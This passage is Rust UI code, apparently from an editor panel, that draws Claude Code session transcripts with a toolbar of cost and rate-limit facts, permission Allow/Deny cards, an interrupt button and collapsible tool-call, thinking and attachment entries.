    /// calls and thinking are part of what is read.
    /// What the store last failed at, or nothing when it has not failed. Drawn by both
    /// halves: the list shows it under the sessions, a tab above the conversation.
    fn render_error(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
        let error = self.store.read(cx).error().cloned()?;
        Some(
            div()
                .px_2()
                .pb_1()
                .child(
                    Label::new(error)
                        .size(LabelSize::XSmall)
                        .color(Color::Error),
                )
                .into_any_element(),
        )
    }

    fn render_conversation_toolbar(
        &self,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> impl IntoElement {
        let showing = self.show_tool_calls;
        let showing_costs = self.show_costs;
        let showing_history = self.show_full_history;
        let pending_agents = self.pending_background_agents();
        let narrow = panel_is_narrow(window);

        let (
            title,
            claude_ai_url,
            meter,
            model,
            effort,
            cost,
            tokens_left,
            rate_limit,
            rate_limit_tooltip,
            lines,
            unpriced,
        ) = {
            let store = self.store.read(cx);
            let spend = store.transcript().spend();
            let status = store.status();
            let selected = store.selected();
            let ai_title = store.main_transcript().ai_title();
            let live = store
                .sessions()
                .iter()
                .find(|session| selected == Some(session.session.session_id.as_str()));
            let ended = store
                .ended_sessions()
                .iter()
                .find(|session| selected == Some(session.session_id.as_str()));
            let title = live
                .map(|session| {
                    SharedString::from(preferred_session_name(&session.session, ai_title))
                })
                .or_else(|| {
                    ended.map(|session| {
                        SharedString::from(preferred_name(
                            session.ai_title.as_deref(),
                            session.name.as_deref(),
                            session.session_id.as_str(),
                        ))
                    })
                });
            let claude_ai_url = claude_ai_session_url(
                store.main_transcript().bridge_session_id().or(live
                    .and_then(|session| session.bridge_session_id.as_deref())
                    .or(ended.and_then(|session| session.bridge_session_id.as_deref()))),
            );
            let meter = context_meter(status, &spend, store.live().compacting);
            let model = toolbar_model(status, &spend);
            let effort = toolbar_effort(status, &spend);
            let cost = toolbar_cost(status, &spend);
            let tokens_left = store.transcript().tokens_left().map(tokens_left_fact);
            let rate_limit = rate_limit_fact(
                status.and_then(|status| status.five_hour_used_percentage),
                status.and_then(|status| status.seven_day_used_percentage),
            );
            let mut reset_parts = Vec::new();
            if let Some(resets_at) = status.and_then(|status| status.five_hour_resets_at)
                && let Some(formatted) = format_resets_at(resets_at)
            {
                reset_parts.push(format!("5h resets {formatted}"));
            }
            if let Some(resets_at) = status.and_then(|status| status.seven_day_resets_at)
                && let Some(formatted) = format_resets_at(resets_at)
            {
                reset_parts.push(format!("7d resets {formatted}"));
            }
            let lines = spend.reported.as_ref().and_then(|reported| {
                line_change_fact(reported.lines_added, reported.lines_removed)
            });
            let unpriced = spend
                .reported
                .as_ref()
                .is_some_and(|reported| reported.has_unknown_model_cost);
            (
                title,
                claude_ai_url,
                meter,
                model,
                effort,
                cost,
                tokens_left,
                rate_limit,
                (!reset_parts.is_empty()).then_some(reset_parts.join("\n")),
                lines,
                unpriced,
            )
        };

        let mut fact_labels = Vec::new();
        if let Some(model) = model {
            fact_labels.push(model);
        }
        if let Some(effort) = effort {
            fact_labels.push(effort);
        }
        if let Some(cost) = cost {
            fact_labels.push(cost);
        }
        if let Some(tokens_left) = tokens_left {
            fact_labels.push(tokens_left);
        }
        if let Some(rate_limit) = rate_limit {
            fact_labels.push(rate_limit);
        }
        if let Some(lines) = lines {
            fact_labels.push(lines);
        }
        if let Some(pending_agents) = pending_agents {
            fact_labels.push(SharedString::from(if pending_agents == 1 {
                "1 pending agent".to_string()
            } else {
                format!("{pending_agents} pending agents")
            }));
        }

        let facts_tooltip = fact_labels
            .iter()
            .map(|fact| fact.to_string())
            .collect::<Vec<_>>()
            .join(" · ");

        h_flex()
            .w_full()
            .flex_none()
            .px_2()
            .py_1()
            .gap_1()
            .justify_between()
            .child(
                h_flex()
                    .gap_1p5()
                    .overflow_hidden()
                    .min_w_0()
                    .children(
                        title.map(|title| Label::new(title).size(LabelSize::Small).single_line()),
                    )
                    .when_some(meter, |this, meter| {
                        let fill_color = match meter.color {
                            Color::Warning => cx.theme().status().warning,
                            Color::Error => cx.theme().status().error,
                            _ => cx.theme().colors().text_muted,
                        };
                        let mut meter_row =
                            h_flex().id("claude-session-context-meter").gap_1().child(
                                div()
                                    .w(px(CONTEXT_METER_WIDTH_PIXELS))
                                    .h_1p5()
                                    .rounded_full()
                                    .bg(cx.theme().colors().background)
                                    .border_1()
                                    .border_color(cx.theme().colors().border)
                                    .overflow_hidden()
                                    .when_some(meter.fill, |this, fill| {
                                        this.child(
                                            div()
                                                .h_full()
                                                .w(relative(fill.clamp(0., 1.)))
                                                .bg(fill_color),
                                        )
                                    }),
                            );
                        meter_row = meter_row.child(
                            Label::new(meter.label)
                                .size(LabelSize::XSmall)
                                .color(meter.color)
                                .single_line(),
                        );
                        if let Some(tooltip) = meter.tooltip {
                            meter_row = meter_row.tooltip(Tooltip::text(tooltip));
                        }
                        this.child(meter_row)
                    })
                    .when(!narrow, |this| {
                        this.children(fact_labels.iter().cloned().enumerate().map(
                            |(index, fact)| {
                                let mut row = h_flex()
                                    .id(SharedString::from(format!("claude-session-fact-{index}")))
                                    .child(
                                        Label::new(fact)
                                            .size(LabelSize::XSmall)
                                            .color(Color::Muted)
                                            .single_line(),
                                    );
                                if let Some(tooltip) = rate_limit_tooltip.as_ref() {
                                    row = row.tooltip(Tooltip::text(tooltip.clone()));
                                }
                                row
                            },
                        ))
                    })
                    .when(narrow && !facts_tooltip.is_empty(), |this| {
                        this.child(
                            h_flex()
                                .id("claude-session-facts-collapsed")
                                .child(Label::new("…").size(LabelSize::XSmall).color(Color::Muted))
                                .tooltip(Tooltip::text(facts_tooltip.clone())),
                        )
                    })
                    .when(unpriced, |this| {
                        this.child(
                            Label::new("unpriced models")
                                .size(LabelSize::XSmall)
                                .color(Color::Warning),
                        )
                    }),
            )
            .child(
                h_flex()
                    .gap_1()
                    .child(
                        IconButton::new(
                            "claude-session-toggle-rail",
                            if self.rail_expanded {
                                IconName::ThreadsSidebarRightOpen
                            } else {
                                IconName::ThreadsSidebarRightClosed
                            },
                        )
                        .icon_size(IconSize::Small)
                        .tooltip(Tooltip::text("Show/Hide details"))
                        .on_click(cx.listener(|this, _, _, cx| {
                            this.rail_expanded = !this.rail_expanded;
                            cx.notify();
                        })),
                    )
                    .child(
                        IconButton::new("claude-session-rail-scope", IconName::Info)
                            .icon_size(IconSize::Small)
                            .toggle_state(self.rail_shows_everything)
                            .tooltip(Tooltip::text(if self.rail_shows_everything {
                                "Show only what the terminal cannot"
                            } else {
                                "Show everything"
                            }))
                            .on_click(
                                cx.listener(|this, _, _, cx| this.toggle_rail_shows_everything(cx)),
                            ),
                    )
                    .children(claude_ai_url.map(|url| {
                        Button::new("claude-session-open-claude-ai", "Open in claude.ai")
                            .label_size(LabelSize::XSmall)
                            .on_click(move |_, _, cx| {
                                cx.open_url(&url);
                            })
                    }))
                    .child(
                        Button::new("claude-session-tool-calls", "Expand all tool calls")
                            .label_size(LabelSize::XSmall)
                            .toggle_state(showing)
                            .on_click(cx.listener(|this, _, _, cx| this.toggle_tool_calls(cx))),
                    )
                    .child(
                        Button::new("claude-session-full-history", "Show full history")
                            .label_size(LabelSize::XSmall)
                            .toggle_state(showing_history)
                            .on_click(cx.listener(|this, _, _, cx| this.toggle_full_history(cx))),
                    )
                    .child(
                        Button::new("claude-session-costs", "Show costs")
                            .label_size(LabelSize::XSmall)
                            .toggle_state(showing_costs)
                            .on_click(cx.listener(|this, _, _, cx| this.toggle_costs(cx))),
                    ),
            )
    }

    fn render_pending_permission(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
        let (title, request_id, inbox, permission_answered) = {
            let store = self.store.read(cx);
            let permission = store.live().pending_permission.as_ref()?;
            let target = tool_target(&serde_json::json!({
                "name": permission.tool_name,
                "input": permission.tool_input,
            }));
            let title = if target.is_empty() {
                format!("Permission requested: {}", permission.tool_name)
            } else {
                format!("Permission requested: {} {}", permission.tool_name, target)
            };
            (
                title,
                store.open_permission_request_id(),
                store.open_permission_inbox_event().cloned(),
                self.permission_answered,
            )
        };

        let mut card = v_flex().w_full().gap_1().px_2().pb_1().child(
            Label::new(title)
                .size(LabelSize::Small)
                .color(Color::Warning),
        );
        if let Some(ChannelInboxEvent::PermissionRequest {
            description,
            input_preview,
            ..
        }) = inbox
        {
            if !description.is_empty() {
                card = card.child(
                    Label::new(SharedString::from(description))
                        .size(LabelSize::XSmall)
                        .color(Color::Muted),
                );
            }
            if !input_preview.is_empty() {
                card = card.child(
                    Label::new(SharedString::from(input_preview))
                        .size(LabelSize::XSmall)
                        .color(Color::Muted),
                );
            }
        }

        if request_id.is_some() {
            if permission_answered {
                card = card.child(
                    Label::new(CHANNEL_PERMISSION_WAITING)
                        .size(LabelSize::XSmall)
                        .color(Color::Muted),
                );
            } else {
                card = card.child(
                    h_flex()
                        .gap_1()
                        .child(
                            Button::new("claude-session-allow", "Allow")
                                .label_size(LabelSize::XSmall)
                                .on_click(
                                    cx.listener(|this, _, _, cx| this.answer_permission(true, cx)),
                                ),
                        )
                        .child(
                            Button::new("claude-session-deny", "Deny")
                                .label_size(LabelSize::XSmall)
                                .on_click(
                                    cx.listener(|this, _, _, cx| this.answer_permission(false, cx)),
                                ),
                        ),
                );
            }
        } else {
            card = card.child(
                Label::new(CHANNEL_PERMISSION_UNAVAILABLE)
                    .size(LabelSize::XSmall)
                    .color(Color::Muted),
            );
        }

        Some(card.into_any_element())
    }

    fn render_status_line(&self, cx: &mut Context<Self>) -> AnyElement {
        let (line, tooltip, can_interrupt, interrupt_sent, interrupt_label, interrupt_tooltip) = {
            let store = self.store.read(cx);
            let now_ms = now_millis();
            let running = matches!(store.live().turn, Turn::Running { .. });
            let interrupt_sent =
                running && interrupt_is_awaiting_result(self.interrupt_sent_at_ms, now_ms);
            let line = format_status_line(
                &store.live().turn,
                store.permission_mode().as_deref(),
                store.channel_live(),
                now_ms,
            );
            let tooltip = permission_tooltip(
                store.permission_mode().as_deref(),
                store.transcript().auto_mode(),
                store.transcript().auto_mode_steer(),
            );
            let interrupt_tooltip = if interrupt_sent {
                "interrupt sent".to_string()
            } else {
                store
                    .interrupt_disabled_reason()
                    .unwrap_or("Stop this turn")
                    .to_string()
            };
            let interrupt_label = if interrupt_sent {
                "interrupt sent"
            } else {
                "Stop"
            };
            (
                line,
                tooltip,
                store.can_interrupt(),
                interrupt_sent,
                interrupt_label,
                interrupt_tooltip,
            )
        };
        h_flex()
            .id("claude-session-status-line")
            .w_full()
            .flex_none()
            .px_2()
            .py_0p5()
            .justify_between()
            .gap_1()
            .child(
                Label::new(line)
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .single_line(),
            )
            .tooltip(Tooltip::text(tooltip))
            .child(
                Button::new("claude-session-interrupt", interrupt_label)
                    .start_icon(Icon::new(IconName::Escape).size(IconSize::XSmall))
                    .label_size(LabelSize::XSmall)
                    .disabled(!can_interrupt || interrupt_sent)
                    .tooltip(Tooltip::text(interrupt_tooltip))
                    .on_click(cx.listener(|this, _, _, cx| this.request_interrupt(cx))),
            )
            .into_any_element()
    }

    fn render_entry(
        &mut self,
        index: usize,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let Some(entry) = self.entries.get(index).cloned() else {
            return div().into_any_element();
        };
        let show_body = self.rail_shows_everything || rail_worth(&entry.kind) == RailWorth::Draw;
        // The cost card is not the message body. A billed message the terminal
        // already shows still carries the card when it is that card's anchor.
        let has_calls = displayed_turn_usage(&self.entries, index, &self.turn_bills).is_some();
        let cost_anchor = !self.rail_shows_everything
            && self.show_costs
            && cost_anchor_at(&self.entries, index, has_calls, &self.billing);
        // An empty slot, not a removed entry: `list_state` is indexed by
        // `self.entries`, and dropping one would shift every splice.
        let key = entry.key.clone();
        let anchor_key = key.clone();
        if !show_body {
            // A hidden body is an empty list slot, not a card. A border on that slot
            // would paint a sliver for a message the rail is not drawing.
            return match self.render_turn_cost(index, cost_anchor, cx) {
                Some(element) => self.present_anchored_entry(&anchor_key, element, cx),
                None => div().h(px(0.)).min_h(px(0.)).into_any_element(),
            };
        }
        let is_expanded = self.expanded.contains(&key);

        let element = match entry.kind {
            EntryKind::Message {
                role,
                source,
                usage,
                answered_at,
            } => {
                // The recap a compaction writes is the length of the conversation it
                // replaced, and it arrives at the top of what the reader is about to
                // read. Drawn closed, like a tool call, so that the session's own
                // messages are what the view opens on.
                if role == MessageRole::CompactSummary || matches!(role, MessageRole::Peer { .. }) {
                    let header = self.render_disclosure_header(
                        DisclosureHeader {
                            entry_index: index,
                            key: &key,
                            icon: role.icon(),
                            icon_color: role.color(),
                            title: role.label(),
                            summary: Some(first_line(&source)),
                            is_expanded,
                        },
                        cx,
                    );
                    let body = if is_expanded {
                        let markdown = self.markdown_for(&key, source, cx);
                        Some(
                            div()
                                .w_full()
                                .px_2()
                                .pb_1()
                                .child(MarkdownElement::new(markdown, markdown_style(window, cx))),
                        )
                    } else {
                        None
                    };
                    v_flex()
                        .w_full()
                        .child(header)
                        .children(body)
                        .into_any_element()
                } else {
                    let markdown = self.markdown_for(&key, source, cx);
                    let cost = self
                        .show_costs
                        .then_some(usage)
                        .flatten()
                        .and_then(|usage| {
                            answer_cost(usage, answered_at.as_ref(), self.store.read(cx))
                        });
                    v_flex()
                        .w_full()
                        .px_4()
                        .py_1()
                        // What the reader typed is given a ground of its own, so that their
                        // own words are told apart from the session's answers by more than
                        // the colour of a rail two characters wide. A wash of the foreground
                        // rather than a fixed grey: it lifts off a dark background and
                        // settles onto a light one, so either theme reads as a step.
                        .when(role == MessageRole::User, |this| {
                            let ground = if self.hovered_anchor.as_ref() == Some(&key) {
                                cx.theme().colors().element_hover
                            } else {
                                USER_MESSAGE_GROUND
                            };
                            this.bg(ground).rounded_sm()
                        })
                        .gap_0p5()
                        .border_l_2()
                        .border_color(role.color().color(cx).opacity(ROLE_RAIL_OPACITY))
                        .child(
                            h_flex()
                                .gap_1()
                                .child(
                                    Icon::new(role.icon())
                                        .size(IconSize::XSmall)
                                        .color(role.color()),
                                )
                                .child(
                                    Label::new(role.label())
                                        .size(LabelSize::XSmall)
                                        .color(role.color()),
                                ),
                        )
                        .child(
                            div()
                                .w_full()
                                .child(MarkdownElement::new(markdown, markdown_style(window, cx))),
                        )
                        .children(cost.map(|cost| {
                            Label::new(cost)
                                .size(LabelSize::XSmall)
                                .color(Color::Hidden)
                        }))
                        .into_any_element()
                }
            }

            EntryKind::Thinking { source } => {
                let header = self.render_disclosure_header(
                    DisclosureHeader {
                        entry_index: index,
                        key: &key,
                        icon: IconName::ToolThink,
                        icon_color: Color::Muted,
                        title: "Thinking".into(),
                        summary: Some(first_line(&source)),
                        is_expanded,
                    },
                    cx,
                );
                let body = if is_expanded {
                    let markdown = self.markdown_for(&key, source, cx);
                    Some(
                        div()
                            .w_full()
                            .px_2()
                            .pb_1()
                            .child(MarkdownElement::new(markdown, markdown_style(window, cx))),
                    )
                } else {
                    None
                };
                v_flex()
                    .w_full()
                    .child(header)
                    .children(body)
                    .into_any_element()
            }

            EntryKind::ToolUse {
                name,
                input,
                id,
                diff,
            } => self.render_tool_use(index, key, name, input, id, diff, is_expanded, window, cx),

            EntryKind::ToolResult {
                label,
                is_error,
                body,
                tool_use_id: _,
            } => {
                let ask_user_answers = (label.as_ref() == ASK_USER_QUESTION_TOOL_NAME)
                    .then(|| ask_user_answer_text(&body))
                    .flatten();
                let summary = if let Some(answers) = ask_user_answers.as_ref() {
                    first_line(answers)
                } else {
                    match &body {
                        ToolResultBody::Inline(text) => first_line(text),
                        // The inline text of a persisted result is the output's own first
                        // tens of kilobytes, so the collapsed row still shows where it
                        // starts, with the size of the whole file after it.
                        ToolResultBody::Persisted(persisted) => {
                            let first_line = first_line(&persisted.preview);
                            if first_line.is_empty() {
                                SharedString::from(format!("{} saved to a file", persisted.size))
                            } else {
                                SharedString::from(format!(
                                    "{first_line} ({} saved to a file)",
                                    persisted.size
                                ))
                            }
                        }
                    }
                };
                let title = if ask_user_answers.is_some() {
                    SharedString::from("Answer")
                } else {
                    label
                };
                let header = self.render_disclosure_header(
                    DisclosureHeader {
                        entry_index: index,
                        key: &key,
                        icon: if is_error {
                            IconName::XCircle
                        } else if ask_user_answers.is_some() {
                            IconName::Check
                        } else {
                            IconName::ToolTerminal
                        },
                        icon_color: if is_error { Color::Error } else { Color::Muted },
                        title,
                        summary: Some(summary),
                        is_expanded,
                    },
                    cx,
                );

                let rendered_body = if is_expanded {
                    Some(if let Some(answers) = ask_user_answers {
                        div()
                            .w_full()
                            .px_2()
                            .pb_1()
                            .child(Label::new(answers).size(LabelSize::Small))
                            .into_any_element()
                    } else {
                        match body {
                            ToolResultBody::Inline(text) => {
                                let output =
                                    self.render_tool_output(index, &key, &text, window, cx);
                                div()
                                    .w_full()
                                    .px_2()
                                    .pb_1()
                                    .child(output)
                                    .into_any_element()
                            }
                            ToolResultBody::Persisted(persisted) => {
                                self.render_persisted_output(index, &key, &persisted, window, cx)
                            }
                        }
                    })
                } else {
                    None
                };

                v_flex()
                    .w_full()
                    .child(header)
                    .children(rendered_body)
                    .into_any_element()
            }

            EntryKind::Image { image, media_type } => v_flex()
                .w_full()
                .px_2()
                .py_1()
                .gap_0p5()
                .child(
                    Label::new(media_type)
                        .size(LabelSize::XSmall)
                        .color(Color::Muted),
                )
                .child({
                    let zoom_key = key.clone();
                    let zoom_image = image.clone();
                    img(image)
                        .id(SharedString::from(format!("claude-entry-image-{key}")))
                        .max_w_full()
                        .max_h(px(480.))
                        .cursor_pointer()
                        .on_click(cx.listener(move |this, _, _, cx| {
                            this.open_zoomed_image(zoom_key.clone(), zoom_image.clone(), cx);
                        }))
                })
                .into_any_element(),

            EntryKind::SentFiles {
                caption,
                files,
                is_error,
                result_text,
            } => {
                let mut column = v_flex()
                    .w_full()
                    .px_2()
                    .py_1()
                    .gap_1()
                    .child(
                        h_flex()
                            .gap_1()
                            .child(
                                Icon::new(if is_error {
                                    IconName::XCircle
                                } else {
                                    IconName::Attach
                                })
                                .size(IconSize::XSmall)
                                .color(if is_error {
                                    Color::Error
                                } else {
                                    Color::Muted
                                }),
                            )
                            .child(
                                Label::new(if files.len() == 1 {
                                    SharedString::from("Sent you a file")
                                } else {
                                    SharedString::from(format!("Sent you {} files", files.len()))
                                })
                                .size(LabelSize::XSmall)
                                .color(if is_error {
                                    Color::Error
                                } else {
                                    Color::Muted
                                }),
                            ),
                    )
                    .when_some(caption, |column, caption| {
                        column.child(Label::new(caption).size(LabelSize::Small))
                    })
                    .when_some(result_text.filter(|_| is_error), |column, text| {
                        column.child(Label::new(text).size(LabelSize::XSmall).color(Color::Error))
                    });

                for (file_index, file) in files.iter().enumerate() {
                    column = column.child(self.render_sent_file(index, &key, file_index, file, cx));
                }

                column.into_any_element()
            }

            EntryKind::LocalCommand { text } => {
                let markdown = self.markdown_for(&key, fenced_code(&text, ""), cx);
                v_flex()
                    .w_full()
                    .px_2()
                    .py_1()
                    .gap_0p5()
                    .child(
                        h_flex()
                            .gap_1()
                            .child(
                                Icon::new(IconName::Terminal)
                                    .size(IconSize::XSmall)
                                    .color(Color::Muted),
                            )
                            .child(
                                Label::new("Local command")
                                    .size(LabelSize::XSmall)
                                    .color(Color::Muted),
                            ),
                    )
                    .child(MarkdownElement::new(markdown, markdown_style(window, cx)))
                    .into_any_element()
            }

            EntryKind::SlashCommand { text } => v_flex()
                .w_full()
                .px_2()
                .py_1()
                .gap_0p5()
                .border_l_2()
                .border_color(
                    MessageRole::User
                        .color()
                        .color(cx)
                        .opacity(ROLE_RAIL_OPACITY),
                )
                .child(
                    h_flex()
                        .gap_1()
                        .child(
                            Icon::new(MessageRole::User.icon())
                                .size(IconSize::XSmall)
                                .color(MessageRole::User.color()),
                        )
                        .child(
                            Label::new(MessageRole::User.label())
                                .size(LabelSize::XSmall)
                                .color(MessageRole::User.color()),
                        ),
                )
                // Drawn as code rather than as prose: what the user typed was a command
                // to the CLI, and the rest of the record was Claude Code's markup for it.
                .child(
                    Label::new(text)
                        .size(LabelSize::Small)
                        .color(Color::Muted)
                        .inline_code(cx),
                )
                .into_any_element(),

            // The session is holding this one behind the turn it is running. Drawn like a
            // pending send, without the button: the queue belongs to the session, and
            // nothing here can take a message out of it.
            EntryKind::Queued { text } => v_flex()
                .w_full()
                .px_4()
                .py_1()
                .gap_0p5()
                .border_l_2()
                .border_color(
                    MessageRole::User
                        .color()
                        .color(cx)
                        .opacity(ROLE_RAIL_OPACITY),
                )
                .bg(if self.hovered_anchor.as_ref() == Some(&key) {
                    cx.theme().colors().element_hover
                } else {
                    USER_MESSAGE_GROUND
                })
                .rounded_sm()
                .child(
                    h_flex()
                        .gap_1()
                        .child(
                            Icon::new(MessageRole::User.icon())
                                .size(IconSize::XSmall)
                                .color(Color::Muted),
                        )
                        .child(
                            Label::new(QUEUED_NOTE)
                                .size(LabelSize::XSmall)
                                .color(Color::Muted),
                        ),
                )
                .child(
                    div()
                        .w_full()
                        .child(Label::new(text).size(LabelSize::Small).color(Color::Muted)),
                )
                .into_any_element(),

            EntryKind::CompactBoundary {
                trigger,
                pre_tokens,
                post_tokens,
            } => {
                let tokens = match (pre_tokens, post_tokens) {
                    (Some(pre), Some(post)) => format!("{pre} -> {post} tokens"),
                    (Some(pre), None) => format!("from {pre} tokens"),
                    (None, Some(post)) => format!("to {post} tokens"),
                    (None, None) => String::new(),
                };
                let toggle_label = if self.show_full_history {
                    "Hide pre-compaction history"
                } else {
                    "Show pre-compaction history"
                };

                v_flex()
                    .w_full()
                    .px_2()
                    .py_2()
                    .gap_1()
                    .child(Divider::horizontal_dashed())
                    .child(
                        h_flex()
                            .gap_1()
                            .flex_wrap()
                            .child(
                                Icon::new(IconName::Compact)
                                    .size(IconSize::XSmall)
                                    .color(Color::Accent),
                            )
                            .child(
                                Label::new(format!("Compacted ({trigger})"))
                                    .size(LabelSize::XSmall)
                                    .color(Color::Accent),
                            )
                            .when(!tokens.is_empty(), |this| {
                                this.child(
                                    Label::new(tokens)
                                        .size(LabelSize::XSmall)
                                        .color(Color::Muted),
                                )
                            }),
                    )
                    .child(
                        Button::new(
                            SharedString::from(format!("compact-history-{index}")),
                            toggle_label,
                        )
                        .label_size(LabelSize::XSmall)
                        .on_click(cx.listener(|this, _, _, cx| this.toggle_full_history(cx))),
                    )
                    .child(Divider::horizontal_dashed())
                    .into_any_element()
            }

            EntryKind::Attachments { items } => {
                let header = self.render_disclosure_header(
                    DisclosureHeader {
                        entry_index: index,
                        key: &key,
                        icon: IconName::Paperclip,
                        icon_color: Color::Muted,
                        title: "Context".into(),
                        summary: Some(SharedString::from(format!("{} attachments", items.len()))),
                        is_expanded,
                    },
                    cx,
                );

                let mut section = v_flex().w_full().child(header);
                if is_expanded {
                    for item in items {
                        section = section.child(self.render_attachment(index, &item, window, cx));
                    }
                }
                section.into_any_element()
            }

            EntryKind::SystemNote { subtype, text, url } => {
                let is_away = subtype.as_ref() == AWAY_SUMMARY_SUBTYPE;
                let title = if is_away {
                    SharedString::from("While you were away")
                } else if subtype.is_empty() {
                    SharedString::from("System")
                } else {
                    subtype
                };
                let mut row = h_flex()
                    .w_full()
                    .px_2()
                    .py_0p5()
                    .gap_1()
                    .child(
                        Icon::new(if is_away {
                            IconName::Clock
                        } else {
                            IconName::Info
                        })
                        .size(IconSize::XSmall)
                        .color(Color::Muted),
                    )
                    .child(
                        Label::new(title)
                            .size(LabelSize::XSmall)
                            .color(Color::Muted),
                    )
                    .child(
                        Label::new(text)
                            .size(LabelSize::XSmall)
                            .color(Color::Muted)
                            .single_line(),
                    );
                if let Some(url) = url {
                    row = row.child(
                        Button::new(
                            SharedString::from(format!("system-note-url-{index}")),
                            "Open",
                        )
                        .label_size(LabelSize::XSmall)
                        .on_click(move |_, _, cx| {
                            cx.open_url(&url);
                        }),
                    );
                }
                row.into_any_element()
            }

            EntryKind::TurnFooter {
                duration_ms,
                message_count,
                pending_background_agents,
            } => Label::new(format_turn_footer(
                duration_ms,
                message_count,
                pending_background_agents,
            ))
            .size(LabelSize::XSmall)
            .color(Color::Muted)
            .into_any_element(),

            EntryKind::TurnSummary {
                turn_id,
                calls,
                files_edited,
                agents,
                thinking_blocks: _,
                duration_ms,
                pending_background_agents: _,
                is_expanded,
            } => {
                let label = format_turn_summary_line(
                    calls,
                    files_edited.len(),
                    agents,
                    duration_ms,
                    is_expanded,
                );
                let tooltip = if files_edited.is_empty() {
                    None
                } else {
                    Some(files_edited.join("\n"))
                };
                let mut row = h_flex()
                    .id(SharedString::from(format!("turn-summary-{turn_id}")))
                    .w_full()
                    .px_2()
                    .py_0p5()
                    .cursor_pointer()
                    .on_click(cx.listener(move |this, _, _, cx| {
                        this.toggle_turn_summary(turn_id.clone(), cx)
                    }))
                    .child(
                        Label::new(label)
                            .size(LabelSize::XSmall)
                            .color(Color::Muted)
                            .single_line(),
                    );
                if let Some(tooltip) = tooltip {
                    row = row.tooltip(Tooltip::text(tooltip));
                }
                if let Some(cost) = self.render_turn_cost(index, cost_anchor, cx) {
                    v_flex().w_full().child(row).child(cost).into_any_element()
                } else {
                    row.into_any_element()
                }
            }

            EntryKind::Unknown { label, raw } => {
                let header = self.render_disclosure_header(
                    DisclosureHeader {
                        entry_index: index,
                        key: &key,
                        icon: IconName::Json,
                        icon_color: Color::Hidden,
                        title: SharedString::from(format!("Unrecognized: {label}")),
                        summary: None,
                        is_expanded,
                    },
                    cx,
                );
                let body = if is_expanded {
                    let markdown = self.markdown_for(&key, fenced_code(&raw, "json"), cx);
                    Some(
                        div()
                            .w_full()
                            .px_2()
                            .pb_1()
                            .child(MarkdownElement::new(markdown, markdown_style(window, cx))),
                    )
                } else {
                    None
                };
                v_flex()
                    .w_full()
                    .child(header)
                    .children(body)
                    .into_any_element()
            }
        };
        self.present_anchored_entry(&anchor_key, element, cx)
    }

    fn render_attachment(
        &mut self,
        entry_index: usize,
        item: &AttachmentItem,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let is_expanded = self.expanded.contains(&item.key);
        let toggle_key = item.key.clone();
        let click_key = item.key.clone();

        let header = ListItem::new(SharedString::from(format!("attachment-{}", item.key)))
            .spacing(ListItemSpacing::Sparse)
            .indent_level(1)
            .toggle(is_expanded)
            .on_toggle(cx.listener(move |this, _, _, cx| {
                this.toggle_expanded(toggle_key.clone(), entry_index, cx)
            }))
            .child(
                Label::new(item.label.clone())
                    .size(LabelSize::XSmall)
                    .color(Color::Muted)
                    .single_line(),
            )
            .on_click(cx.listener(move |this, _, _, cx| {
                this.toggle_expanded(click_key.clone(), entry_index, cx)
            }));

        let body = if is_expanded {
            Some(match &item.persisted {
                Some(persisted) => {
                    self.render_persisted_output(entry_index, &item.key, persisted, window, cx)
                }
                None => {
                    let markdown = self.markdown_for(&item.key, fenced_code(&item.body, ""), cx);
                    div()
                        .w_full()
                        .pl_4()
                        .pr_2()
                        .pb_1()
                        .child(MarkdownElement::new(markdown, markdown_style(window, cx)))
                        .into_any_element()
                }
            })
        } else {
            None
        };

        v_flex()
            .w_full()
            .child(header)
            .children(body)
            .into_any_element()
    }

    fn render_tool_use(
        &mut self,
        index: usize,
        key: SharedString,
        name: SharedString,
        input: SharedString,
        id: Option<SharedString>,
        diff: Option<SharedString>,
        is_expanded: bool,
        window: &mut Window,
        cx: &mut Context<Self>,
    ) -> AnyElement {
        let (parsed, target) = {
            let parsed = self.entry_cache.parsed_tool_input(&key, &input);
            let target = tool_target_from_input(parsed);
            (parsed.cloned(), target)
        };

        if name.as_ref() == TODO_WRITE_TOOL_NAME {
            if let Some(todos) = parsed.as_ref().and_then(parse_todos) {
                return self.render_todo_card(index, &key, todos, is_expanded, cx);
            }
        }
        if name.as_ref() == ASK_USER_QUESTION_TOOL_NAME {
            if let Some(questions) = parsed.as_ref().and_then(parse_asked_questions) {
                let answers = self.ask_user_answers_after(index);
                return self.render_question_card(index, &key, questions, answers, is_expanded, cx);
            }
        }
        if name.as_ref() == EDIT_TOOL_NAME
            && let Some(diff) = edit_card_diff(diff.as_ref(), id.as_ref(), &self.patched_calls)
        {
            return self.render_diff_card(index, &key, &name, &target, diff, is_expanded, cx);
        }
        if name.as_ref() == BASH_TOOL_NAME {
            if let Some(command) = parsed
                .as_ref()
                .and_then(|input| input.get("command"))
                .and_then(Value::as_str)
                && let Some(dispatch) = parse_cli_dispatch(command)
            {
                return self.render_dispatch_card(index, &key, dispatch, is_expanded, window, cx);
            }
        }

        let (title, server_chip) = match mcp_tool_parts(name.as_ref()) {
            Some((server, tool)) => (
                SharedString::from(tool.to_string()),
                Some(SharedString::from(server.to_string())),
            ),
            None => (name.clone(), None),
        };

        let display = tool_input_display(&name, &input);
        let summary = if target.is_empty() {
            first_line(&display.text)
        } else {
            target
        };
        let header = self.render_disclosure_header(
            DisclosureHeader {
                entry_index: index,
                key: &key,
                icon: IconName::ToolHammer,
                icon_color: Color::Success,
                title,
                summary: Some(summary),
                is_expanded,
            },
            cx,
        );
        let body = if is_expanded {
            let markdown = self.markdown_for(&key, display.code_block(), cx);
            Some(
                div()
                    .w_full()
                    .px_2()
                    .pb_1()
                    .child(MarkdownElement::new(markdown, markdown_style(window, cx))),
            )
        } else {
            None
        };
        let cards = self.agent_cards(&key, cx);
        let run_note = self
            .agent_calls
            .get(&key)
            .filter(|call| call.is_workflow && !cards.is_empty())
            .map(|_| workflow_run_note(&cards));
        let mut element = v_flex().w_full().child(header);
        if let Some(server) = server_chip {
            element = element.child(
                div().w_full().px_2().child(
                    Label::new(server)
                        .size(LabelSize::XSmall)
                        .color(Color::Muted),
                ),
            );
        }
        element = element.children(body);
        if let Some(run_note) = run_note {
            element = element.child(
                div().w_full().px_2().pb_1().child(
                    Label::new(run_note)
                        .size(LabelSize::XSmall)
                        .color(Color::Muted),
                ),
